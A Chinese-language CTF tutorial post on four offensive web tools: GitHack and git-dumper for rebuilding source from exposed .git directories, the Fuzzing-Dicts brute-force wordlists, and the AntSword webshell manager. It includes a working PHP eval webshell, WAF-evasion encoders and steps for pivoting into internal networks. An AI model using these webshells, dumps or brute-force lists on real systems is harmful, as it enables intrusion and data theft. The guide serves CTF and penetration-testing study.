---

title: Githack git-dumper Fuzzing-Dicts 蚁剑(Windows)
date: 2026-07-23
categories: ["web-tools"]
permalink: /web-tools/githack-git-dumper-fuzzing-dicts-蚁剑windows
---

# 一、GitHack
## 1. 安装
**1.访问 GitHack 的 GitHub 页面：**`https://github.com/lijiejie/GitHack`
**2.点击绿色的 "Code"** 按钮，选择 **"Download ZIP"**。
## 2. 作用
**GitHack 是一个用 Python 写的 `.git` 目录泄露利用脚本**。它的原理是通过泄露的 `.git` 文件夹下的文件，重建还原出工程的源代码，并且保持原始的目录结构不变。
**在 CTF 中的作用：**
- **还原网站源码**：如果目标网站的 `.git` 目录没有正确配置访问权限，被直接暴露在公网上，GitHack 就能把整个源码仓库下载下来。拿到源码后你就可以进行**代码审计（白盒审计）**，直接找 Flag 或者发现隐藏的漏洞。
- **找到硬编码的敏感信息**：源码里经常硬编码着数据库密码、`Secret Key`、`Token`、`API Key` 等敏感信息，甚至 Flag 就直接写在源码的注释里。
- **发现隐藏的管理员接口**：前端源码里可能藏着未公开的管理后台路径或 API 接口，这些在页面上是看不到的。
## 3. 使用
在解压的文件夹下打开CMD
#### (1) 还原目标网站的源码
```
python GitHack.py http://目标网址/.git/
```
执行后 GitHack 会解析 `.git/index` 文件找到所有文件名和对应的 sha1 值，然后去 `.git/objects/` 文件夹下载对应的文件，zlib 解压后按原始目录结构写入源代码。



# 二、git-dumper
## 1. 安装
**1.访问 git-dumper 的 GitHub 页面：**`https://github.com/arthaud/git-dumper`
**2.点击绿色的 "Code"** 按钮，选择 **"Download ZIP"**。
## 2. 作用
**git-dumper 是一个 Python 写的工具，功能比 GitHack 更强大**。它同样用来从暴露的 `.git` 目录中还原源码，但更智能、更强大：
- **智能恢复**：如果目标服务器开启了目录列表，git-dumper 会直接递归下载整个 `.git` 目录（和 `wget` 一样）；如果目录列表被关闭，它会通过分析 `.git/HEAD`、`.git/index`、`.git/logs` 等文件，逐步推导出所有的 Git 对象哈希值，然后逐个下载，最后执行 `git checkout .` 还原出完整的源码。
- **支持更多场景**：有些网站只暴露了部分 `.git` 文件，GitHack 可能还原不出来，但 git-dumper 能通过"猜哈希"的方式尽可能多地恢复文件。
- **支持代理和自定义请求头**：方便搭配 Burp Suite 等抓包工具进行调试。
## 3. 使用
使用git-dumper之前需要安装它所需要的依赖(即特定的第三方库)，确保解压的.zip里面有**requirements.txt**文件。
#### (1)输入命令安装依赖
在解压的文件夹下打开CMD
```
默认源：pip install -r requirements.txt
清华源(大陆用这个)：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt
```
#### (2) 快速命令帮助
```
python git_dumper.py -h
```
![](/images/20260721170930.webp)
#### (3) 基本用法 —— 下载 .git 目录到本地
```
python git_dumper.py http://目标网址/.git/ 输出目录
```
例如：
```
python git_dumper.py http://example.com/.git/ C:\Users\30842\Desktop\example_src
```
#### (4) 使用代理（搭配 Burp Suite 抓包）
```
python git_dumper.py http://目标网址/.git/ 输出目录 --proxy http://127.0.0.1:8080
```
#### (5) 设置多线程加速下载
```
python git_dumper.py http://目标网址/.git/ 输出目录 -j 10
```
`-j` 参数指定同时发起的请求数量，默认是单线程，设置 10 可以显著加快下载速度。
#### (6) 自定义 User-Agent
```
python git_dumper.py http://目标网址/.git/ 输出目录 -u "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```
#### (7) 添加自定义请求头
```
python git_dumper.py http://目标网址/.git/ 输出目录 -H "Cookie=session=xxx" -H "Authorization=Bearer xxx"
```
#### (8) 指定额外的分支名
```
python git_dumper.py http://目标网址/.git/ 输出目录 -b dev -b test
```
`-b` 参数可以指定额外的分支名来尝试恢复，因为默认只会尝试 `master` 和 `main`，如果目标用了其他分支名（比如 `dev`、`test`），就需要手动指定。
#### (9) 设置超时和重试次数
```
python git_dumper.py http://目标网址/.git/ 输出目录 -t 30 -r 5
```
`-t` 设置超时时间（秒），`-r` 设置请求失败后的重试次数。
#### (10) 完整示例（实战常用）
```
python git_dumper.py http://target.com/.git/ ./output -j 10 --proxy http://127.0.0.1:8080 -b dev -b test
```
这条命令会：用 10 个线程、通过 Burp Suite 代理、额外尝试 `dev` 和 `test` 分支，把 `.git` 目录还原到 `./output` 文件夹中。



# 三、Fuzzing-Dicts
## 1. 安装
**1.访问 Fuzzing-Dicts 的 GitHub 页面：**`https://github.com/3had0w/Fuzzing-Dicts`
**2.点击绿色的 "Code"** 按钮，选择 **"Download ZIP"**。
## 2. 作用
**Fuzzing-Dicts 不是一个工具，而是一个专门为 Web 渗透测试和 CTF 整理的"字典集合"**。它里面收集了大量常用的高频字典文件，覆盖了渗透测试中几乎所有需要"爆破"或"猜解"的场景。
**在 CTF 中的作用：**
- **目录扫描**：`Directory/` 文件夹下有 `php.txt`、`asp.txt`、`aspx.txt`、`jsp.txt`、`dir.txt`、`dir_big.txt` 等字典，配合 Dirsearch 等工具对目标网站进行目录爆破，找到隐藏的页面或文件。
- **备份文件猜解**：`常见网站备份文件字典（2954）.txt` 和 `其它不常用备份文件字典（678）.txt` 收集了各种备份文件命名方式（如 `.bak`、`.zip`、`.swp`、`.tar.gz`），用来扫出网站的备份源码。
- **弱口令爆破**：`Password-Top1000.txt`、`Password-Top10W.txt`、`3位字母数字+常用密码（50104）.txt`、`4位字母数字+常用密码（1729309）.txt` 等密码字典，配合 Burp Suite 或 Hydra 对登录框进行弱口令爆破。
- **WebShell 密码猜解**：`WebShell-Password（433616）.txt` 收集了常见 Webshell（如 冰蝎、哥斯拉、蚁剑）的连接密码，拿到 Webshell 后可以用这个字典猜解其他同名 Shell 的密码。
- **后台路径猜解**：`高效网站后台目录字典（20101）.txt` 收集了各种网站后台管理页面的路径，配合扫描器快速定位后台登录入口。
- **用户名枚举**：`Username-Top500.txt`、`Webmanage-Username.txt` 收集了常见的用户名，用于爆破登录。
- **LFI 利用**：`LFI-Interesting-Files（249）.txt` 包含了本地文件包含（LFI）漏洞利用时常用的敏感文件路径，直接用于测试 LFI 漏洞。
- **身份证/手机号猜解**：`常见身份证后六位字典（337590）.txt`、`高效手机号码.txt`，用于需要手机号或身份证后六位验证的场景。
## 3. 使用
Fuzzing-Dicts 本身是一个字典集合，需要配合其他工具使用。最常见的是配合 **Dirsearch** 进行目录扫描。
#### (1) 配合 Dirsearch 使用自己的字典扫描
```
python3 dirsearch -u <目标网址> -w Fuzzing-Dicts/Directory/php.txt
```
#### (2) 扫描备份文件
```
python3 dirsearch -u <目标网址> -w Fuzzing-Dicts/常见网站备份文件字典（2954）.txt
```
#### (3) 扫描后台路径
```
python3 dirsearch -u <目标网址> -w Fuzzing-Dicts/高校网站后台目录字典（20101）.txt
```
#### (4) 扫描所有语言类型的目录（遍历所有字典）
```
python3 dirsearch -u <目标网址> -w Fuzzing-Dicts/Directory/
```
直接指定整个文件夹路径，Dirsearch 会自动遍历文件夹下的所有字典文件。
#### (5) 配合其他工具使用
这些字典是通用的文本文件，任何支持自定义字典的工具都可以使用：
- **Burp Suite Intruder**：加载密码字典进行弱口令爆破
- **Gobuster**：`gobuster dir -u <目标网址> -w Fuzzing-Dicts/Directory/dir_big.txt`
- **FFUF**：`ffuf -u <目标网址>/FUZZ -w Fuzzing-Dicts/Directory/php.txt`
- **Hydra**：配合密码字典进行 SSH/RDP/FTP 等服务的暴力破解



# 四、蚁剑（AntSword）
## 1. 安装
**1. 访问蚁剑的 GitHub 页面：** `https://github.com/AntSwordProject/antSword`
**2. 点击绿色的 "Code"** 按钮，选择 **"Download ZIP"**。
**3. 解压后双击运行 `AntSword.exe`**（Windows 版本），首次启动会提示选择语言（支持中文）和设置本地数据存储路径。
> 蚁剑本身只是一个"外壳/客户端"，需要配合自己上传的 **Webshell（一句话木马）** 才能使用。

<video src="/videos/AntSword.mp4" controls width="100%" preload="metadata" style="max-width:100%;border-radius:8px;"></video>

## 2. 作用
**蚁剑是一款跨平台的开源 Webshell 管理工具**，主要用于 CTF 和渗透测试中管理已获取的 Webshell。它的核心功能：
- **管理 Webshell**：添加/编辑/删除多个 Webshell 连接，支持 PHP、ASP、ASPX、JSP、Node.js 等多种脚本语言。
- **文件管理**：通过 Webshell 对目标服务器进行文件浏览、上传、下载、编辑、删除、重命名等操作，支持在线编辑代码文件。
- **命令执行**：内置虚拟终端，可直接执行系统命令（`cmd` / `bash`），支持切换目录、查看进程等。
- **数据库管理**：支持连接目标数据库（MySQL、SQL Server、Oracle 等），执行 SQL 查询。
- **代理功能**：可将目标服务器作为跳板，配合 Burp Suite 或Proxifier 对内网进行渗透。
- **插件扩展**：支持安装第三方插件，如端口扫描、内网反弹 shell 等高级功能。
- **编码传输**：默认对传输内容进行 Base64 编码，可绕过部分 WAF/防火墙的检测。

**在 CTF 中的作用：**
- 上传一句话木马后，用蚁剑连接，快速浏览服务器源码找到 Flag 文件。
- 执行系统命令读取敏感文件（如 `/flag`、`/root/flag.txt`）。
- 通过数据库管理功能查找数据库中存储的 Flag 或敏感信息。
- 利用代理功能进行内网渗透，探测内网其他主机。

## 3. 使用
#### (1) 准备一句话木马（以 PHP 为例）
在目标网站上传或通过文件包含漏洞写入以下代码：
```php
<?php @eval($_POST['ant']); ?>
```
其中 `ant` 是连接密码，可自定义。

#### (2) 添加 Webshell 到蚁剑
1. 右键点击蚁剑主界面左侧空白区域 → 选择 **「添加数据」**。
2. 填写配置：
   - **URL**：Webshell 的完整地址，如 `http://target.com/shell.php`
   - **连接密码**：POST 参数名，如 `ant`（与 Webshell 中的密码一致）
   - **编码器**：默认 `default`（Base64），可根据需要选择 `chr`、`hex`、`base64_custom` 等绕过 WAF
   - **脚本类型**：选择对应的语言（PHP / ASP / ASPX / JSP 等）
3. 点击 **「测试连接」**，成功后点击 **「添加」**。

#### (3) 连接 Webshell
双击添加的条目，蚁剑会自动连接并打开文件管理界面，左侧显示服务器目录结构。

#### (4) 文件管理
- **浏览文件**：双击进入目录，右键文件可进行编辑、下载、删除、重命名。
- **上传文件**：右键空白区域 → **「上传文件」**，选择本地文件上传到服务器。
- **下载文件**：右键目标文件 → **「下载文件」**，保存到本地。
- **新建文件/文件夹**：右键空白区域 → **「新建文件/文件夹」**。
- **终端执行**：右键空白区域 → **「终端」**，打开虚拟终端执行命令。

#### (5) 命令执行（虚拟终端）
1. 右键当前目录 → 选择 **「终端」**。
2. 在底部终端输入命令：
```
whoami
ipconfig (Windows) / ifconfig (Linux)
cat /flag
dir C:\ (Windows) / ls -la / (Linux)
```
3. 蚁剑会自动选择合适的工作目录和命令解释器。

#### (6) 数据库管理
1. 右键 Webshell 条目 → 选择 **「数据操作」** → **「数据库配置」**。
2. 填写数据库信息：
   - **数据库类型**：MySQL / SQL Server / Oracle 等
   - **主机**：`localhost` 或目标 IP
   - **端口**：默认 `3306`（MySQL）
   - **用户名/密码**：数据库账号
3. 点击 **「测试」** → 成功后即可执行 SQL 查询。

#### (7) 代理功能（内网渗透）
1. 右键 Webshell 条目 → 选择 **「代理」** → **「设置」**。
2. 配置本地监听端口（如 `127.0.0.1:1080`）。
3. 开启代理后，配合 Proxifier 或浏览器代理插件，将目标服务器作为跳板访问内网。

#### (8) 编码器选择（绕过 WAF）
蚁剑支持多种编码方式规避 WAF 检测：
- `default`：Base64 编码（默认）
- `chr`：将所有字符转为 chr() 函数拼接
- `hex`：转为十六进制
- `base64_custom`：自定义 Base64 字符表
- `rot13`：ROT13 编码
- `base64_bypass`：针对特定 WAF 的绕过编码

在添加/编辑 Webshell 时，在 **「编码器」** 下拉框中选择即可。

#### (9) 插件安装
1. 点击顶部菜单 **「应用商店」**。
2. 浏览可用插件（如端口扫描、反弹 shell、提权辅助等）。
3. 点击 **「安装」**，安装后在终端或右键菜单中调用。

#### (10) 完整 CTF 使用流程示例
```
1. 发现目标存在文件上传漏洞 → 上传 PHP 一句话木马 shell.php
2. 蚁剑添加 Webshell：URL=http://target.com/shell.php，密码=ant，编码器=chr
3. 连接成功 → 进入文件管理 → 浏览 /var/www/html/ 或 C:\inetpub\wwwroot\
4. 在终端执行 cat /flag 或 dir C:\flag*
5. 若需数据库操作 → 配置数据库连接 → 查找数据库中的 Flag
6. 若需内网渗透 → 开启代理 → 扫描内网其他主机
```
